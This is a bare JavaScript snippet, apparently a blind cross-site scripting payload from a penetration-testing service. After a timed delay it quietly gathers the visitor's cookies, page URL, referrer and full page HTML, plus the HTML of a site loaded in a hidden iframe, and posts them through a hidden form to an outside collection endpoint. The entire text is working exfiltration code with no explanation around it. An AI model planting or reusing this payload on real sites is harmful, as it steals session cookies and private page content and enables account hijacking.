setTimeout(function() { if (document.getElementById('img_exists') == null) { //alert('starting'); var frm = document.createElement('form'); frm.setAttribute('action', 'https://pentest-tools.com/x/?id=dbbf9'); frm.setAttribute('method', 'POST'); frm.setAttribute('enctype', 'multipart/form-data'); var cookies = document.cookie; var inp = document.createElement('input'); inp.setAttribute('type', 'hidden'); inp.setAttribute('name', 'cookies'); inp.setAttribute('value', cookies); frm.appendChild(inp); //alert('cookies = ' + cookies); var url = document.location.href; var inp = document.createElement('input'); inp.setAttribute('type', 'hidden'); inp.setAttribute('name', 'url'); inp.setAttribute('value', url); frm.appendChild(inp); var referer = document.referrer; var inp = document.createElement('input'); inp.setAttribute('type', 'hidden'); inp.setAttribute('name', 'referer'); inp.setAttribute('value', referer); frm.appendChild(inp); var html = document.getElementsByTagName('html'); if (html != null) { var crt_page = html[0].innerHTML; var inp = document.createElement('input'); inp.setAttribute('type', 'hidden'); inp.setAttribute('name', 'crt_page'); inp.setAttribute('value', crt_page); frm.appendChild(inp); } var ifrm = document.createElement('iframe'); ifrm.setAttribute('width', 0); ifrm.setAttribute('height', 0); ifrm.setAttribute('id', 'custom_page_iframe'); ifrm.setAttribute('src', 'https://mygre.ets.org'); ifrm.setAttribute('visibility', 'hidden'); ifrm.setAttribute('style', 'display: none'); document.body.appendChild(ifrm); setTimeout( function() { try { var ifrm = document.getElementById('custom_page_iframe'); var html = ifrm.contentWindow.document.getElementsByTagName('html'); var custom_page = html[0].innerHTML; } catch (err) { var custom_page = 'Custom page could not be loaded from client side'; } var inp = document.createElement('input'); inp.setAttribute('type', 'hidden'); inp.setAttribute('name', 'custom_page'); inp.setAttribute('value', custom_page); frm.appendChild(inp); var ifrm = document.createElement('iframe'); ifrm.setAttribute('width', '0'); ifrm.setAttribute('height', '0'); ifrm.setAttribute('visibility', 'hidden'); ifrm.setAttribute('style', 'display: none'); ifrm.src = 'data:text/html;charset=utf-8,' + encodeURI(''); document.body.appendChild(ifrm); ifrm.contentWindow.document.body.appendChild(frm); // Add marker before submit var el = document.createElement('img'); el.setAttribute('width', 0); el.setAttribute('height', 0); el.setAttribute('style', 'visibility: none'); el.setAttribute('id', 'img_exists'); document.body.appendChild(el); frm.submit(); //alert('submitted'); }, 2000); } }, 3000); // end first setTimeout 
